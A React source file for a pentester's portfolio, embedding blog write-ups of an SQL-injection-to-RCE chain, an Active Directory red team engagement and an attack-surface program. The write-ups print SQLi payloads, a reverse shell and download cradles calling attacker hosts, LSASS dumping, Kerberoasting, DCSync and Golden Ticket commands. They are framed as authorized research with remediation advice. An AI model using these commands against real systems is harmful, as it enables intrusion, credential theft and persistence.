import { Toaster } from "@/components/ui/sonner";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Bug,
  Check,
  ChevronRight,
  Copy,
  ExternalLink,
  Github,
  Linkedin,
  Loader2,
  Lock,
  Mail,
  Search,
  Shield,
  Terminal,
} from "lucide-react";
import { motion } from "motion/react";
import { useEffect, useRef, useState } from "react";
import { toast } from "sonner";
import { useSubmitContact } from "./hooks/useQueries";

const queryClient = new QueryClient();

export default function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <Portfolio />
      <Toaster position="bottom-right" theme="dark" />
    </QueryClientProvider>
  );
}

// ─── Blog Post Data ──────────────────────────────────────────────────────────

type SectionType =
  | { type: "heading"; content: string }
  | { type: "paragraph"; content: string }
  | { type: "code"; content: string; language: string; filename?: string }
  | { type: "callout"; content: string; variant: "info" | "warning" }
  | { type: "divider" };

interface BlogPost {
  id: string;
  title: string;
  category: string;
  date: string;
  difficulty: "Easy" | "Medium" | "Hard";
  readTime: string;
  coverImage: string;
  tags: string[];
  sections: SectionType[];
}

const PROJECT_CARDS = [
  {
    gradient: "from-[#0d2b1e] to-[#091a14]",
    accentColor: "#39D36E",
    tag: "WEB PENTEST",
    title: "SQL Injection to RCE",
    description:
      "Full chain exploitation of a financial portal — SQLi to shell via stored procedure abuse. Achieved domain admin in 4 hours.",
    tags: ["SQLi", "RCE", "Bug Bounty"],
    postIndex: 0,
  },
  {
    gradient: "from-[#0d1e2b] to-[#091419]",
    accentColor: "#2FD7D7",
    tag: "ACTIVE DIRECTORY",
    title: "AD Red Team Engagement",
    description:
      "Full internal red team from phishing to domain compromise — Kerberoasting, lateral movement, DCSync, and persistence via GPO.",
    tags: ["CRTP", "BloodHound", "Mimikatz"],
    postIndex: 1,
  },
  {
    gradient: "from-[#2b1a0d] to-[#1a1009]",
    accentColor: "#E8A825",
    tag: "VULNERABILITY MGMT",
    title: "Enterprise ASM Program",
    description:
      "Built and operationalized an attack surface management program reducing external exposure by 60% within 3 months.",
    tags: ["ASM", "Nuclei", "Shodan"],
    postIndex: 2,
  },
];

const BLOG_POSTS: BlogPost[] = [
  {
    id: "sqli-to-rce",
    title:
      "SQL Injection to RCE: Full Chain Exploitation of a Financial Portal",
    category: "WEB PENTEST",
    date: "March 2026",
    difficulty: "Hard",
    readTime: "18 min read",
    coverImage: "/assets/generated/blog-sqli-cover.dim_800x400.jpg",
    tags: ["SQLi", "RCE", "MSSQL", "xp_cmdshell", "Bug Bounty"],
    sections: [
      {
        type: "heading",
        content: "OVERVIEW",
      },
      {
        type: "paragraph",
        content:
          "During a black-box penetration test of a financial services portal, I identified a critical SQL Injection vulnerability in the authentication endpoint that ultimately led to Remote Code Execution (RCE) on the underlying Windows Server 2019 host via MSSQL's xp_cmdshell stored procedure. This writeup documents the full exploitation chain from initial recon to domain admin access.",
      },
      {
        type: "callout",
        variant: "warning",
        content:
          "WARNING: This research was conducted under an authorized penetration testing engagement. All techniques described are for educational purposes only. Unauthorized exploitation is illegal.",
      },
      { type: "divider" },
      {
        type: "heading",
        content: "PHASE 1 — RECONNAISSANCE",
      },
      {
        type: "paragraph",
        content:
          "Initial recon started with a full port scan using nmap to identify open services and enumerate running software versions. The target was a single IP (10.10.10.45) hosting what appeared to be a .NET web application on IIS.",
      },
      {
        type: "code",
        language: "bash",
        filename: "01_nmap_scan.sh",
        content:
          "# Full TCP scan with version detection and default scripts\nnmap -sV -sC -p- --min-rate 5000 -oN nmap_full.txt 10.10.10.45\n\n# Output (relevant excerpt):\n# PORT      STATE SERVICE       VERSION\n# 80/tcp    open  http          Microsoft IIS httpd 10.0\n# 443/tcp   open  ssl/https     Microsoft IIS httpd 10.0\n# 1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019\n# 3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n#\n# Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows",
      },
      {
        type: "paragraph",
        content:
          "With MSSQL exposed on port 1433 and IIS on 80/443, this was a promising attack surface. I ran gobuster to enumerate web directories and identify hidden endpoints.",
      },
      {
        type: "code",
        language: "bash",
        filename: "02_gobuster.sh",
        content:
          "gobuster dir -u https://10.10.10.45 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \\\n  -x aspx,asp,config -t 50 -k -o gobuster_out.txt\n\n# Findings:\n# /login.aspx        (Status: 200)\n# /admin/            (Status: 302 -> /login.aspx)\n# /api/              (Status: 200)\n# /api/user          (Status: 500) <-- server error, suspicious!\n# /web.config        (Status: 403)",
      },
      { type: "divider" },
      {
        type: "heading",
        content: "PHASE 2 — SQL INJECTION DISCOVERY",
      },
      {
        type: "paragraph",
        content:
          "The /login.aspx endpoint used a username/password form. Manual testing with a single quote in the username field triggered a verbose MSSQL error — a classic indicator of error-based SQL injection. The application was not using parameterized queries.",
      },
      {
        type: "code",
        language: "sql",
        filename: "03_sqli_payload.sql",
        content:
          "-- Initial probe: single quote causes server error\n-- Username: admin'\n-- Error: Unclosed quotation mark after the character string 'admin'\n\n-- Basic auth bypass attempt:\nUsername: admin'--\nPassword: anything\n\n-- Error-based extraction: version enumeration\nUsername: ' UNION SELECT @@version,NULL,NULL--\n-- Returns: Microsoft SQL Server 2019 (RTM) - 15.0.2000.5\n\n-- Database enumeration\nUsername: ' UNION SELECT name,NULL,NULL FROM master..sysdatabases--\n-- Returns: master, tempdb, model, msdb, FinanceDB",
      },
      {
        type: "paragraph",
        content:
          "With the database structure partially mapped, I moved to sqlmap to automate extraction while staying within rate limits to avoid detection by the WAF.",
      },
      {
        type: "code",
        language: "bash",
        filename: "04_sqlmap.sh",
        content:
          "# Run sqlmap against the login form\nsqlmap -u 'https://10.10.10.45/login.aspx' \\\n  --data='username=admin&password=test&submit=Login' \\\n  --level=5 --risk=3 \\\n  --dbms=mssql \\\n  --technique=EUSTQ \\\n  --batch \\\n  --random-agent \\\n  -p username\n\n# Enumerate all databases\nsqlmap [...] --dbs\n# Available databases: master, FinanceDB, HRPortal\n\n# Dump users table from FinanceDB\nsqlmap [...] -D FinanceDB -T users --dump\n# id | username  | password_hash                          | role\n# 1  | sysadmin  | $2y$12$abcXYZ... (bcrypt)              | admin\n# 2  | jdoe      | $2y$12$defABC... (bcrypt)              | user",
      },
      { type: "divider" },
      {
        type: "heading",
        content: "PHASE 3 — ENABLING xp_cmdshell FOR RCE",
      },
      {
        type: "paragraph",
        content:
          "MSSQL's xp_cmdshell stored procedure allows execution of OS commands. It's disabled by default but can be re-enabled via sp_configure if the connected account has sufficient privileges. The FinanceDB connection was running as sa (system administrator) — a severe misconfiguration.",
      },
      {
        type: "code",
        language: "sql",
        filename: "05_xp_cmdshell.sql",
        content:
          "-- Check current user and privileges\nSELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');\n-- Returns: sa | 1  (confirmed sysadmin)\n\n-- Enable advanced options\nEXEC sp_configure 'show advanced options', 1;\nRECONFIGURE;\n\n-- Enable xp_cmdshell\nEXEC sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;\n\n-- Test command execution\nEXEC xp_cmdshell 'whoami';\n-- Output: nt service\\mssqlserver\n\n-- List domain information\nEXEC xp_cmdshell 'net group \"Domain Admins\" /domain';\n-- Members: Administrator, svc_backup",
      },
      {
        type: "callout",
        variant: "info",
        content:
          "KEY INSIGHT: The MSSQL service account had SeImpersonatePrivilege enabled. This is the prerequisite for a JuicyPotato / PrintSpoofer privilege escalation to SYSTEM.",
      },
      {
        type: "code",
        language: "python",
        filename: "06_reverse_shell.py",
        content:
          "#!/usr/bin/env python3\n# Reverse shell payload delivered via xp_cmdshell\nimport socket, subprocess, os\n\nHOST = '10.10.14.22'  # Attacker IP\nPORT = 4444\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((HOST, PORT))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\nsubprocess.call(['/bin/sh', '-i'])\n\n# Delivery via xp_cmdshell:\n# EXEC xp_cmdshell 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString(http://10.10.14.22/shell.py)\"'",
      },
      { type: "divider" },
      {
        type: "heading",
        content: "PHASE 4 — PRIVILEGE ESCALATION TO SYSTEM",
      },
      {
        type: "paragraph",
        content:
          "With a shell as nt service\\mssqlserver, I used PrintSpoofer to escalate to NT AUTHORITY\\SYSTEM leveraging the SeImpersonatePrivilege token.",
      },
      {
        type: "code",
        language: "bash",
        filename: "07_privesc.sh",
        content:
          "# Check privileges\nwhoami /priv\n# SeImpersonatePrivilege   Enabled\n\n# Upload PrintSpoofer64.exe via certutil\ncertutil -urlcache -split -f http://10.10.14.22/PrintSpoofer64.exe C:\\Temp\\ps.exe\n\n# Execute to spawn SYSTEM shell\nC:\\Temp\\ps.exe -i -c cmd.exe\n\n# Confirm:\nwhoami\n# NT AUTHORITY\\SYSTEM\n\n# Dump LSASS for credential extraction\nprocdump64.exe -ma lsass.exe C:\\Temp\\lsass.dmp\n\n# Extract hashes with Mimikatz\nmimikatz.exe\nsekurlsa::minidump C:\\Temp\\lsass.dmp\nsekurlsa::logonpasswords",
      },
      { type: "divider" },
      {
        type: "heading",
        content: "REMEDIATION RECOMMENDATIONS",
      },
      {
        type: "paragraph",
        content:
          "This attack chain exploited multiple compounding misconfigurations. The following remediations should be implemented immediately, in priority order:",
      },
      {
        type: "callout",
        variant: "info",
        content:
          "CRITICAL FIXES: (1) Use parameterized queries / prepared statements — eliminates SQLi entirely. (2) Run MSSQL as a least-privilege service account — never as sa. (3) Disable xp_cmdshell if unused. (4) Implement WAF with SQL injection detection rules. (5) Enable network segmentation — database port 1433 should not be externally accessible.",
      },
    ],
  },
  {
    id: "ad-red-team",
    title:
      "Active Directory Red Team: From Phishing to Domain Admin in 6 Hours",
    category: "ACTIVE DIRECTORY",
    date: "January 2026",
    difficulty: "Hard",
    readTime: "22 min read",
    coverImage: "/assets/generated/blog-ad-cover.dim_800x400.jpg",
    tags: ["CRTP", "BloodHound", "Kerberoasting", "DCSync", "Golden Ticket"],
    sections: [
      {
        type: "heading",
        content: "ENGAGEMENT OVERVIEW",
      },
      {
        type: "paragraph",
        content:
          "A financial services firm engaged our team for a full internal red team exercise with the objective of achieving domain compromise. The scope included the corp.local Active Directory domain with ~800 users and 12 domain controllers. Starting with zero credentials, we achieved domain admin access in under 6 hours via a phishing campaign, BloodHound-guided lateral movement, and Kerberoasting.",
      },
      {
        type: "callout",
        variant: "warning",
        content:
          "DISCLAIMER: This engagement was conducted with written authorization. All domain names, IP addresses, and usernames are anonymized. Do not reproduce without authorization.",
      },
      { type: "divider" },
      {
        type: "heading",
        content: "PHASE 1 — INITIAL ACCESS VIA PHISHING",
      },
      {
        type: "paragraph",
        content:
          "OSINT via LinkedIn and the company website revealed 15 employees in the finance team. We crafted a spear-phishing email impersonating the company's IT helpdesk, delivering a macro-enabled Excel file that executed a Cobalt Strike beacon on open.",
      },
      {
        type: "code",
        language: "powershell",
        filename: "01_macro_payload.ps1",
        content:
          "# Macro dropped via Excel VBA — executes staged PowerShell beacon\n# VBA snippet (obfuscated in delivery):\n# Shell \"powershell -nop -w hidden -enc <base64_payload>\", vbHide\n\n# Decoded payload:\n$wc = New-Object System.Net.WebClient\n$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')\n$code = $wc.DownloadString('https://cdn-delivery[.]net/update.ps1')\nIEX $code\n\n# Beacon established from: FINANCE-PC-07\n# User context: CORP\\j.anderson (Finance Analyst)",
      },
      { type: "divider" },
      {
        type: "heading",
        content: "PHASE 2 — INTERNAL RECON WITH BLOODHOUND",
      },
      {
        type: "paragraph",
        content:
          "With a foothold as a low-privileged domain user, we ran SharpHound to collect Active Directory data for BloodHound analysis. BloodHound identified a clear attack path from j.anderson to Domain Admins via two hops.",
      },
      {
        type: "code",
        language: "powershell",
        filename: "02_bloodhound_collection.ps1",
        content:
          "# Run SharpHound from Cobalt Strike beacon\nExecute-Assembly /opt/tools/SharpHound.exe \\\n  -c All \\\n  --domain corp.local \\\n  --zipfilename bloodhound_data.zip\n\n# PowerView enumeration — identify Kerberoastable accounts\nImport-Module PowerView.ps1\nGet-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname\n\n# Output:\n# samaccountname    serviceprincipalname\n# svc_webapp        HTTP/webapp.corp.local\n# svc_backup        MSSQLSvc/sqlprod.corp.local:1433\n# svc_monitor       WSMAN/monitoring.corp.local\n\n# Check for AS-REP Roastable accounts (no pre-auth)\nGet-DomainUser -PreauthNotRequired | Select-Object samaccountname",
      },
      {
        type: "callout",
        variant: "info",
        content:
          "BLOODHOUND FINDING: j.anderson -> MemberOf -> IT-Helpdesk-Group -> GenericAll -> svc_backup. This means j.anderson can reset svc_backup's password, and svc_backup has WriteDACL on Domain Admins OU.",
      },
      { type: "divider" },
      {
        type: "heading",
        content: "PHASE 3 — KERBEROASTING",
      },
      {
        type: "paragraph",
        content:
          "Three Kerberoastable accounts were identified. We requested TGS tickets for all three and cracked svc_backup's hash offline within 8 minutes using Hashcat with the rockyou wordlist.",
      },
      {
        type: "code",
        language: "powershell",
        filename: "03_kerberoasting.ps1",
        content:
          "# Rubeus Kerberoasting — request TGS for all SPNs\n.\\Rubeus.exe kerberoast /outfile:tgs_hashes.txt /nowrap\n\n# Output:\n# [*] SamAccountName  : svc_backup\n# [*] ServicePrincipalName: MSSQLSvc/sqlprod.corp.local:1433\n# [*] Hash:\n# $krb5tgs$23$*svc_backup$corp.local$MSSQLSvc/sqlprod.corp.local:1433*$...\n\n# Crack with Hashcat (mode 13100 = Kerberos TGS-REP)\nhashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt \\\n  --force -O\n\n# Result: svc_backup : B@ckup$ecure2024!  (cracked in 8 min)",
      },
      { type: "divider" },
      {
        type: "heading",
        content: "PHASE 4 — LATERAL MOVEMENT",
      },
      {
        type: "paragraph",
        content:
          "With svc_backup's credentials, we authenticated to the backup server and performed pass-the-hash against domain controllers using impacket. The service account had local admin rights on 6 servers due to excessive privilege assignment.",
      },
      {
        type: "code",
        language: "bash",
        filename: "04_lateral_movement.sh",
        content:
          "# psexec to backup server with cracked credentials\npython3 /opt/impacket/examples/psexec.py \\\n  corp.local/svc_backup:'B@ckup$ecure2024!'@BACKUP-SRV-01\n\n# Dump local credentials from memory\nmimikatz # sekurlsa::logonpasswords\n# Found: CORP\\svc_dc_sync NTLM hash: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c\n\n# Verify DA-equivalent rights\nnet group \"Domain Admins\" /domain\n\n# Use wmiexec for lateral movement (less noisy than psexec)\npython3 wmiexec.py corp.local/svc_dc_sync@DC01.corp.local \\\n  -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
      },
      { type: "divider" },
      {
        type: "heading",
        content: "PHASE 5 — DCSYNC & DOMAIN COMPROMISE",
      },
      {
        type: "paragraph",
        content:
          "The svc_dc_sync account had DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights — precisely the permissions needed for a DCSync attack. We extracted all domain password hashes including the krbtgt account.",
      },
      {
        type: "code",
        language: "bash",
        filename: "05_dcsync.sh",
        content:
          "# DCSync via impacket secretsdump\npython3 secretsdump.py \\\n  corp.local/svc_dc_sync@DC01.corp.local \\\n  -hashes :8846f7eaee8fb117ad06bdd830b7586c \\\n  -just-dc-ntlm\n\n# Output (excerpt):\n# Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n# krbtgt:502:aad3b435b51404ee:a6fdc4b5f4e7c5dc8c9af3c3a9bfa8e2:::  <-- GOLDEN TICKET!\n# svc_backup:1105:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n\n# Alternative: Mimikatz DCSync\nmimikatz # lsadump::dcsync /domain:corp.local /all /csv",
      },
      {
        type: "heading",
        content: "PHASE 6 — GOLDEN TICKET PERSISTENCE",
      },
      {
        type: "paragraph",
        content:
          "Using the krbtgt hash, we forged a Golden Ticket — a persistent Kerberos TGT valid for any user, including Domain Admin. This provides indefinite access even after password resets (until krbtgt is rotated twice).",
      },
      {
        type: "code",
        language: "powershell",
        filename: "06_golden_ticket.ps1",
        content:
          "# Forge Golden Ticket with Mimikatz\nmimikatz # kerberos::golden \\\n  /domain:corp.local \\\n  /sid:S-1-5-21-3623811015-3361044348-30300820 \\\n  /krbtgt:a6fdc4b5f4e7c5dc8c9af3c3a9bfa8e2 \\\n  /user:Administrator \\\n  /groups:512 \\\n  /ptt\n\n# Verify ticket in memory\nkerberos::list\n\n# Access any DC as Domain Admin\ndir \\\\DC01.corp.local\\C$\n# Access granted — domain fully compromised",
      },
      { type: "divider" },
      {
        type: "heading",
        content: "REMEDIATION RECOMMENDATIONS",
      },
      {
        type: "callout",
        variant: "info",
        content:
          "CRITICAL FIXES: (1) Implement tiered admin model — service accounts must not have DA-equivalent rights. (2) Enable Protected Users Security Group for privileged accounts. (3) Rotate krbtgt password twice immediately. (4) Deploy LAPS for local admin password management. (5) Enable Credential Guard on domain-joined workstations. (6) Implement email security (DMARC, sandbox) to stop phishing initial access.",
      },
    ],
  },
  {
    id: "enterprise-asm",
    title:
      "Building an Enterprise ASM Program: 60% Exposure Reduction in 90 Days",
    category: "VULNERABILITY MGMT",
    date: "November 2025",
    difficulty: "Medium",
    readTime: "14 min read",
    coverImage: "/assets/generated/blog-asm-cover.dim_800x400.jpg",
    tags: ["ASM", "Nuclei", "Shodan", "Amass", "Automation"],
    sections: [
      {
        type: "heading",
        content: "PROGRAM OVERVIEW",
      },
      {
        type: "paragraph",
        content:
          "When I joined the security team at a Fortune 500 enterprise, the organization had no formal Attack Surface Management (ASM) program. External assets were undocumented, shadow IT was rampant, and the last external exposure assessment was over 18 months old. This writeup documents how I designed and operationalized an ASM program from scratch, reducing external exposure by 60% within 90 days.",
      },
      {
        type: "callout",
        variant: "info",
        content:
          "WHAT IS ASM? Attack Surface Management is the continuous discovery, classification, prioritization, and monitoring of all internet-facing assets belonging to an organization — including assets the security team doesn't know about.",
      },
      { type: "divider" },
      {
        type: "heading",
        content: "PHASE 1 — ASSET DISCOVERY",
      },
      {
        type: "paragraph",
        content:
          "The first challenge was building a comprehensive asset inventory. I combined passive DNS enumeration, certificate transparency logs, and active scanning to map the full external attack surface. The organization owned 3 primary domains and 12 subsidiary brands.",
      },
      {
        type: "code",
        language: "bash",
        filename: "01_amass_enum.sh",
        content:
          '#!/bin/bash\n# Passive + active subdomain enumeration with Amass\n\n# Passive enumeration (no direct contact with target)\namass enum -passive -d example.com \\\n  -o amass_passive_out.txt\n\n# Active enumeration with brute-force\namass enum -active -d example.com \\\n  -brute -min-for-recursive 2 \\\n  -o amass_active_out.txt \\\n  -config /root/.config/amass/config.ini\n\n# Enumerate all subsidiary domains in parallel\nfor domain in $(cat domains.txt); do\n  amass enum -passive -d $domain >> all_assets.txt &\ndone\nwait\n\n# Deduplicate and sort\nsort -u all_assets.txt > unique_assets.txt\necho "Total unique subdomains: $(wc -l < unique_assets.txt)"',
      },
      {
        type: "paragraph",
        content:
          "Amass discovered 847 subdomains. But raw subdomain lists aren't enough — I needed to know which ones were live, what services they ran, and which belonged to the organization vs. third-party providers.",
      },
      {
        type: "code",
        language: "bash",
        filename: "02_shodan_enrichment.sh",
        content:
          "# Resolve live hosts from subdomain list\nhttpx -l unique_assets.txt \\\n  -status-code -title -tech-detect \\\n  -o live_hosts.txt -threads 50\n\n# Shodan enrichment for IP context\n# Convert to IPs first\ncat live_hosts.txt | grep -oP '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' | sort -u > ips.txt\n\n# Query Shodan for each IP (requires API key)\nwhile IFS= read -r ip; do\n  shodan host \"$ip\" --format json >> shodan_data.json 2>/dev/null\ndone < ips.txt\n\n# Parse vulnerabilities from Shodan data\njq -r '.vulns // empty | to_entries[] | .key' shodan_data.json | sort | uniq -c | sort -rn",
      },
      { type: "divider" },
      {
        type: "heading",
        content: "PHASE 2 — VULNERABILITY SCANNING AT SCALE",
      },
      {
        type: "paragraph",
        content:
          "With 423 confirmed live hosts, I used Nuclei for template-based vulnerability scanning. Nuclei's template library covers CVEs, misconfigurations, exposed panels, and sensitive data exposure — perfect for broad ASM scanning.",
      },
      {
        type: "code",
        language: "bash",
        filename: "03_nuclei_scan.sh",
        content:
          '#!/bin/bash\n# Mass vulnerability scanning with Nuclei\n\n# Update templates to latest\nnuclei -update-templates\n\n# Run scan across all live hosts\nnuclei -l live_hosts.txt \\\n  -t /root/nuclei-templates/ \\\n  -severity critical,high,medium \\\n  -concurrency 50 \\\n  -rate-limit 150 \\\n  -o nuclei_findings.json \\\n  -json\n\n# Filter critical findings for immediate action\njq \'. | select(.info.severity == "critical")\' nuclei_findings.json\n\n# Summary stats\necho "Critical: $(jq \'. | select(.info.severity=="critical")\' nuclei_findings.json | grep -c "template-id")"\necho "High:     $(jq \'. | select(.info.severity=="high")\' nuclei_findings.json | grep -c "template-id")"\necho "Medium:   $(jq \'. | select(.info.severity=="medium")\' nuclei_findings.json | grep -c "template-id")"',
      },
      {
        type: "paragraph",
        content:
          "Nuclei returned 1,847 findings across the 423 hosts. To make these actionable, I wrote a Python deduplication and enrichment script to normalize findings, remove false positives, and map each finding to an asset owner.",
      },
      {
        type: "code",
        language: "python",
        filename: "04_asset_dedup.py",
        content:
          "#!/usr/bin/env python3\n\"\"\"\nASM Asset Deduplication & Owner Mapping Script\nMerges Amass + Nuclei output, deduplicates findings,\nand enriches with team ownership data from CMDB.\n\"\"\"\nimport json\nimport csv\nfrom collections import defaultdict\nfrom pathlib import Path\n\ndef load_nuclei_findings(filepath: str) -> list[dict]:\n    findings = []\n    with open(filepath) as f:\n        for line in f:\n            if line.strip():\n                findings.append(json.loads(line))\n    return findings\n\ndef deduplicate_findings(findings: list[dict]) -> list[dict]:\n    \"\"\"Deduplicate by (host, template-id) pair\"\"\"\n    seen = set()\n    unique = []\n    for f in findings:\n        key = (f.get('host', ''), f.get('template-id', ''))\n        if key not in seen:\n            seen.add(key)\n            unique.append(f)\n    return unique\n\ndef map_owners(findings: list[dict], cmdb_csv: str) -> list[dict]:\n    \"\"\"Map findings to asset owners from CMDB export\"\"\"\n    owner_map = {}\n    with open(cmdb_csv) as f:\n        for row in csv.DictReader(f):\n            owner_map[row['hostname']] = row['team']\n    \n    for f in findings:\n        host = f.get('host', '').replace('https://', '').replace('http://', '').split('/')[0]\n        f['owner_team'] = owner_map.get(host, 'Unknown')\n    return findings\n\nif __name__ == '__main__':\n    findings = load_nuclei_findings('nuclei_findings.json')\n    deduped = deduplicate_findings(findings)\n    enriched = map_owners(deduped, 'cmdb_export.csv')\n    \n    # Group by owner team\n    by_team = defaultdict(list)\n    for f in enriched:\n        by_team[f['owner_team']].append(f)\n    \n    print(f'Total findings: {len(findings)}')\n    print(f'After dedup: {len(deduped)} ({len(findings)-len(deduped)} duplicates removed)')\n    for team, items in sorted(by_team.items(), key=lambda x: -len(x[1])):\n        print(f'  {team}: {len(items)} findings')",
      },
      { type: "divider" },
      {
        type: "heading",
        content: "PHASE 3 — RISK SCORING METHODOLOGY",
      },
      {
        type: "paragraph",
        content:
          "Raw CVSS scores are insufficient for business risk prioritization. I implemented a composite risk score that factors in CVSS base score, asset criticality (public-facing vs internal), exploitation likelihood (EPSS score), and business impact tier.",
      },
      {
        type: "code",
        language: "bash",
        filename: "05_risk_automation.sh",
        content:
          '#!/bin/bash\n# Daily ASM scan automation — runs at 02:00 UTC\n# Cronjob: 0 2 * * * /opt/asm/daily_scan.sh >> /var/log/asm/scan.log 2>&1\n\nDATESTAMP=$(date +%Y-%m-%d)\nOUTPUT_DIR=/opt/asm/results/$DATESTAMP\nmkdir -p $OUTPUT_DIR\n\necho "[*] Starting daily ASM scan: $DATESTAMP"\n\n# Step 1: Refresh asset list\namass enum -passive -d example.com -o $OUTPUT_DIR/subdomains.txt\n\n# Step 2: Resolve live hosts\nhttpx -l $OUTPUT_DIR/subdomains.txt -o $OUTPUT_DIR/live_hosts.txt -silent\n\n# Step 3: Nuclei scan\nnuclei -l $OUTPUT_DIR/live_hosts.txt \\\n  -severity critical,high \\\n  -o $OUTPUT_DIR/findings.json -json -silent\n\n# Step 4: Compare with previous day for new findings\nprev_day=$(date -d \'yesterday\' +%Y-%m-%d)\nif [ -f /opt/asm/results/$prev_day/findings.json ]; then\n  python3 /opt/asm/diff_findings.py \\\n    /opt/asm/results/$prev_day/findings.json \\\n    $OUTPUT_DIR/findings.json \\\n    --notify-slack\nfi\n\necho "[+] Scan complete. Results: $OUTPUT_DIR"',
      },
      { type: "divider" },
      {
        type: "heading",
        content: "RESULTS — 90 DAY OUTCOMES",
      },
      {
        type: "paragraph",
        content:
          "After 90 days of continuous ASM operations, the results exceeded initial targets. The program surfaced 14 forgotten internet-facing servers, 3 misconfigured S3 buckets with sensitive data exposure, and 2 critical CVEs in unpatched systems. Remediation rate hit 94% for critical/high findings within SLA.",
      },
      {
        type: "callout",
        variant: "info",
        content:
          "PROGRAM RESULTS (90 Days): External attack surface reduced by 60% | 847 subdomains catalogued | 423 live hosts continuously monitored | 1,847 raw findings → 312 unique actionable items | 14 unknown assets discovered & remediated | Critical finding SLA compliance: 94% | Program now fully automated with daily scans and Slack alerting.",
      },
    ],
  },
];

// ─── Blog View Component ──────────────────────────────────────────────────────

function CodeBlock({
  content,
  language,
  filename,
}: {
  content: string;
  language: string;
  filename?: string;
}) {
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(content);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div
      className="rounded-sm overflow-hidden border border-neon-green/20 my-5"
      style={{ boxShadow: "0 0 10px #39D36E11" }}
    >
      {/* Code block header */}
      <div
        className="flex items-center justify-between px-4 py-2 border-b border-neon-green/20"
        style={{ background: "#0d1a12" }}
      >
        <div className="flex items-center gap-2">
          <span className="w-2.5 h-2.5 rounded-full bg-[#FF5F57]" />
          <span className="w-2.5 h-2.5 rounded-full bg-[#FFBD2E]" />
          <span className="w-2.5 h-2.5 rounded-full bg-[#28CA41]" />
          <span className="ml-3 text-xs text-neon-green/60 font-mono">
            {filename ?? language}
          </span>
        </div>
        <button
          type="button"
          onClick={handleCopy}
          className="flex items-center gap-1.5 text-xs text-muted-foreground hover:text-neon-green transition-colors"
          data-ocid="blog.code.button"
        >
          {copied ? (
            <>
              <Check size={12} className="text-neon-green" />
              <span className="text-neon-green">copied</span>
            </>
          ) : (
            <>
              <Copy size={12} />
              copy
            </>
          )}
        </button>
      </div>
      {/* Code content */}
      <pre
        className="overflow-x-auto px-5 py-4 text-xs leading-6 font-mono text-neon-green"
        style={{ background: "#060d0a" }}
      >
        <code>{content}</code>
      </pre>
    </div>
  );
}

function BlogView({
  post,
  onBack,
}: {
  post: BlogPost;
  onBack: () => void;
}) {
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  const difficultyColor =
    post.difficulty === "Hard"
      ? "text-red-400 border-red-400/40"
      : post.difficulty === "Medium"
        ? "text-yellow-400 border-yellow-400/40"
        : "text-neon-green border-neon-green/40";

  const categoryColor =
    post.category === "ACTIVE DIRECTORY"
      ? "text-accent border-accent/40"
      : post.category === "VULNERABILITY MGMT"
        ? "text-yellow-400 border-yellow-400/40"
        : "text-neon-green border-neon-green/40";

  return (
    <div className="min-h-screen font-mono" data-ocid="blog.panel">
      {/* Sticky top bar */}
      <header className="sticky top-0 z-50 border-b border-card-border/60 bg-[#0B0F12]/95 backdrop-blur-sm">
        <div className="max-w-4xl mx-auto px-6 py-3 flex items-center gap-4">
          <button
            type="button"
            onClick={onBack}
            className="text-xs text-neon-green border border-neon-green/50 px-3 py-1.5 hover:bg-neon-green/10 transition-all duration-200 shrink-0"
            style={{ boxShadow: "0 0 6px #39D36E22" }}
            data-ocid="blog.back.button"
          >
            [← BACK_TO_PORTFOLIO]
          </button>
          <span className="text-xs text-muted-foreground truncate hidden md:block">
            {post.title}
          </span>
        </div>
      </header>

      <main className="max-w-4xl mx-auto px-6 pb-20">
        {/* Cover image */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="mt-8 mb-8 overflow-hidden rounded-sm border border-card-border"
          style={{ maxHeight: 320 }}
        >
          <img
            src={post.coverImage}
            alt={post.title}
            className="w-full object-cover"
            style={{ maxHeight: 320 }}
          />
        </motion.div>

        {/* Category + title */}
        <motion.div
          initial={{ opacity: 0, y: 15 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.1 }}
        >
          <div
            className={`text-xs font-bold tracking-widest mb-3 ${categoryColor}`}
          >
            [{post.category}]
          </div>
          <h1
            className="text-xl md:text-2xl font-bold text-foreground leading-snug mb-5"
            style={{ textShadow: "0 0 14px #39D36E22" }}
          >
            {post.title}
          </h1>
        </motion.div>

        {/* Metadata row */}
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.2 }}
          className="flex flex-wrap items-center gap-3 mb-8 pb-6 border-b border-card-border/60"
        >
          <span className="text-xs px-2 py-0.5 border border-card-border/80 text-muted-foreground">
            {post.date}
          </span>
          <span
            className={`text-xs px-2 py-0.5 border font-semibold ${difficultyColor}`}
          >
            {post.difficulty.toUpperCase()}
          </span>
          <span className="text-xs text-muted-foreground">{post.readTime}</span>
          <div className="flex flex-wrap gap-2 ml-auto">
            {post.tags.map((tag) => (
              <span
                key={tag}
                className="text-xs px-2 py-0.5 border border-neon-green/20 text-neon-green/70"
              >
